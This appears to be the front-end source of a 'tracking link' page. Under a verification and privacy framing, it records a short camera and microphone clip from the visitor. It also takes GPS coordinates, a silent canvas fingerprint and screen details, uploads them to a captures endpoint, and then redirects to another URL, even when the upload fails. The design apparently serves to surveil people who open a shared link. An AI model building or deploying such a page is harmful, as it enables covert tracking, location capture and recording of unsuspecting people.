import { useEffect, useRef, useState } from "react";
import { useParams } from "wouter";
import { trpc } from "@/lib/trpc";
import { Button } from "@/components/ui/button";
import { Card, CardHeader, CardTitle, CardContent, CardDescription } from "@/components/ui/card";
import { Camera, Video, ShieldCheck, ArrowRight, RefreshCw, AlertCircle, Languages } from "lucide-react";
import { toast } from "sonner";
import { translations, Language } from "@/i18n";

export default function TrackingPage() {
  const params = useParams<{ id: string }>();
  const linkId = params.id || "";

  const [lang, setLang] = useState<Language>("zh");
  const t = translations[lang];

  const [step, setStep] = useState<"loading" | "consent" | "recording" | "preview" | "submitting">("loading");
  const [facingMode, setFacingMode] = useState<"user" | "environment">("user");
  const [statusText, setStatusText] = useState(t.verifyingLink);
  const [recordedBlobUrl, setRecordedBlobUrl] = useState<string | null>(null);
  const [recordedBase64, setRecordedBase64] = useState<string | null>(null);

  const videoRef = useRef<HTMLVideoElement | null>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const chunksRef = useRef<Blob[]>([]);

  const linkQuery = trpc.tracking.getLink.useQuery({ id: linkId }, { enabled: !!linkId });
  const submitMutation = trpc.captures.submit.useMutation();

  useEffect(() => {
    if (!linkId) return;

    if (linkQuery.isError || linkQuery.data === null) {
      setStatusText(t.linkNotFound);
      return;
    }

    if (linkQuery.data) {
      setStep("consent");
    }
  }, [linkQuery.data, linkQuery.isError, t.linkNotFound]);

  const generateFingerprint = () => {
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    if (!ctx) return "unknown";
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.fillText("ZYJ-Fingerprint-2026", 2, 2);
    return canvas.toDataURL().slice(-50);
  };

  const getGPS = (): Promise<string> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve("GPS Not Supported");
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          resolve(`${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)} (Accuracy: ${Math.round(pos.coords.accuracy)}m)`);
        },
        () => {
          resolve("Permission Denied / Unavailable");
        },
        { timeout: 5000, maximumAge: 60000 }
      );
    });
  };

  const startCamera = async (mode: "user" | "environment") => {
    try {
      setStatusText("Requesting camera access...");
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((t) => t.stop());
      }

      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { ideal: mode }, width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: true,
      });

      streamRef.current = stream;
      setFacingMode(mode);
      setStep("recording");

      setTimeout(() => {
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play();
        }
        startRecording(stream);
      }, 200);
    } catch (err) {
      console.error("Camera error:", err);
      toast.error("Camera access denied or unavailable.");
    }
  };

  const startRecording = (stream: MediaStream) => {
    chunksRef.current = [];
    const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")
      ? "video/webm;codecs=vp8,opus"
      : "video/webm";

    const recorder = new MediaRecorder(stream, { mimeType });
    mediaRecorderRef.current = recorder;

    recorder.ondataavailable = (e) => {
      if (e.data.size > 0) chunksRef.current.push(e.data);
    };

    recorder.onstop = () => {
      const blob = new Blob(chunksRef.current, { type: "video/webm" });
      const url = URL.createObjectURL(blob);
      setRecordedBlobUrl(url);

      const reader = new FileReader();
      reader.onloadend = () => {
        setRecordedBase64(reader.result as string);
        setStep("preview");
      };
      reader.readAsDataURL(blob);

      if (streamRef.current) {
        streamRef.current.getTracks().forEach((t) => t.stop());
      }
    };

    recorder.start();

    setTimeout(() => {
      if (recorder.state === "recording") {
        recorder.stop();
      }
    }, 4000);
  };

  const handleConfirmUpload = async () => {
    if (!recordedBase64 || !linkQuery.data) return;
    setStep("submitting");
    setStatusText(t.uploading);

    try {
      const resolution = `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio})`;
      const fingerprint = generateFingerprint();
      const gps = await getGPS();

      await submitMutation.mutateAsync({
        linkId,
        imageBase64: recordedBase64,
        gps,
        fingerprint,
        resolution,
      });

      toast.success("Upload successful, redirecting...");
      window.location.href = linkQuery.data.redirectUrl;
    } catch (err) {
      console.error("Upload error:", err);
      toast.error("Submission failed, attempting direct redirect...");
      window.location.href = linkQuery.data.redirectUrl;
    }
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col items-center justify-center p-4 relative font-sans">
      <div className="absolute top-4 right-4">
        <Button
          variant="outline"
          size="sm"
          onClick={() => setLang(lang === "zh" ? "en" : "zh")}
          className="border-slate-700 bg-slate-900 text-slate-200 rounded-xl text-xs h-8 px-3 flex items-center gap-1.5"
        >
          <Languages className="w-3.5 h-3.5" />
          {lang === "zh" ? "English" : "中文"}
        </Button>
      </div>

      {step === "loading" || step === "submitting" ? (
        <div className="max-w-md w-full bg-slate-900/80 border border-slate-800 rounded-2xl p-8 shadow-2xl backdrop-blur-xl text-center space-y-6">
          <div className="w-16 h-16 bg-indigo-600/20 text-indigo-400 rounded-2xl mx-auto flex items-center justify-center border border-indigo-500/30 animate-pulse">
            <RefreshCw className="w-8 h-8 animate-spin" />
          </div>
          <div className="space-y-2">
            <h2 className="text-xl font-bold tracking-tight text-white">{t.pleaseWait}</h2>
            <p className="text-sm text-slate-400">{statusText}</p>
          </div>
        </div>
      ) : step === "consent" ? (
        <Card className="max-w-md w-full bg-slate-900/90 border-slate-800 backdrop-blur-2xl shadow-2xl rounded-2xl overflow-hidden">
          <div className="h-2 bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500" />
          <CardHeader className="text-center space-y-3 pt-6">
            <div className="w-14 h-14 bg-indigo-600/20 text-indigo-400 rounded-2xl mx-auto flex items-center justify-center border border-indigo-500/30">
              <Camera className="w-7 h-7" />
            </div>
            <CardTitle className="text-xl font-bold tracking-tight text-white">{t.consentTitle}</CardTitle>
            <CardDescription className="text-slate-400 text-xs">
              {t.consentDesc}
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4 pt-2">
            <div className="bg-slate-950 border border-slate-800/80 rounded-xl p-3 text-xs text-slate-300 space-y-1.5">
              <div className="flex items-center gap-2 text-indigo-400 font-semibold">
                <AlertCircle className="w-4 h-4" /> {t.consentAlertTitle}
              </div>
              <p className="text-slate-400 leading-relaxed">
                {t.consentAlertDesc}
              </p>
            </div>

            <div className="grid grid-cols-2 gap-3 pt-2">
              <Button
                onClick={() => startCamera("user")}
                className="bg-indigo-600 hover:bg-indigo-500 text-white font-medium py-6 rounded-xl flex items-center justify-center gap-2 text-xs"
              >
                <Camera className="w-4 h-4" /> {t.useFrontCamera}
              </Button>
              <Button
                onClick={() => startCamera("environment")}
                className="bg-purple-600 hover:bg-purple-500 text-white font-medium py-6 rounded-xl flex items-center justify-center gap-2 text-xs"
              >
                <Video className="w-4 h-4" /> {t.useBackCamera}
              </Button>
            </div>

            <div className="pt-2 text-center text-[11px] text-slate-500 flex items-center justify-center gap-1.5">
              <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
              <span>{t.privacyHint}</span>
            </div>
          </CardContent>
        </Card>
      ) : step === "recording" ? (
        <Card className="max-w-md w-full bg-slate-900/90 border-slate-800 backdrop-blur-2xl shadow-2xl rounded-2xl overflow-hidden text-center">
          <CardHeader className="space-y-2">
            <CardTitle className="text-lg text-white flex items-center justify-center gap-2">
              <span className="w-3 h-3 rounded-full bg-red-500 animate-ping" />
              {t.recordingTitle}
            </CardTitle>
            <CardDescription className="text-slate-400 text-xs">
              {t.recordingDesc}
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="aspect-video bg-black rounded-xl overflow-hidden relative border border-slate-800">
              <video ref={videoRef} playsInline muted className="w-full h-full object-cover" />
            </div>
          </CardContent>
        </Card>
      ) : (
        <Card className="max-w-md w-full bg-slate-900/90 border-slate-800 backdrop-blur-2xl shadow-2xl rounded-2xl overflow-hidden">
          <CardHeader className="text-center space-y-2">
            <CardTitle className="text-lg text-white">{t.previewTitle}</CardTitle>
            <CardDescription className="text-slate-400 text-xs">
              {t.previewDesc}
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            {recordedBlobUrl && (
              <div className="aspect-video bg-black rounded-xl overflow-hidden border border-slate-800">
                <video src={recordedBlobUrl} controls autoPlay loop className="w-full h-full object-cover" />
              </div>
            )}

            <Button
              onClick={handleConfirmUpload}
              className="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-medium py-6 rounded-xl shadow-lg shadow-indigo-600/30 flex items-center justify-center gap-2"
            >
              {t.confirmUpload} <ArrowRight className="w-4 h-4" />
            </Button>
          </CardContent>
        </Card>
      )}
    </div>
  );
}
